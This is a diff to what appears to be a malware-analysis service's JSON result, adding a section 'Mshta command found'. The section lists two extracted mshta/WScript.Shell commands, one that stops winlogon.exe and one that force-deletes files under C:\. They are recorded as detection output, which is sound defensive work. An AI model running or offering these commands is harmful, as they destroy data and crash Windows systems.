@@ -92,6 +92,17 @@
         "tags": {},
         "title_text": "Execution of manipulated content",
         "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "[[\"TABLE\", [{\"Command\": \"mshta \\\"javascript:new ActiveXObject('WScript.Shell').Run('stop -pn winlogon.exe',0);window.close()\\\"\"}, {\"Command [trun.]\": \"mshta \\\"javascript:new ActiveXObject('WScript.Shell').Run('cmd /c del /f /a /q C:\\\\\\\\*',0);window.close\"}]]]",
+        "body_format": "MULTI",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {},
+        "title_text": "Mshta command found",
+        "zeroize_on_tag_safe": false
       }
     ]
   },
